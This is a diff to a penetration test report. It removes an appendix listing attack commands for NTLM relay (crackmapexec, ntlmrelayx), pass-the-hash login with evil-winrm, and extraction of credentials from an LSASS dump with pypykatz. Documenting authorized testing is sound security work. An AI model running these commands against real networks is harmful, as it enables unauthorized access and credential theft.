@@ -81,12 +81,6 @@ This document presents a detailed account of the penetration testing executed ag
 ## Conclusion
 The penetration test exposed multiple critical vulnerabilities that could potentially be exploited to gain unauthorized access and control over network resources.
 
-## Appendix
-- **Tools and Commands**:
-    - `crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt`
-    - `impacket-ntlmrelayx -smb2support -tf targets.txt`
-    - `evil-winrm -i 10.100.1.4 -u filemaker -H [NetNTLM hash]`
-    - `pypykatz lsa minidump lsass.dmp`
 
 ## References
 - [Hashcat Rule-based Attack Guide](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
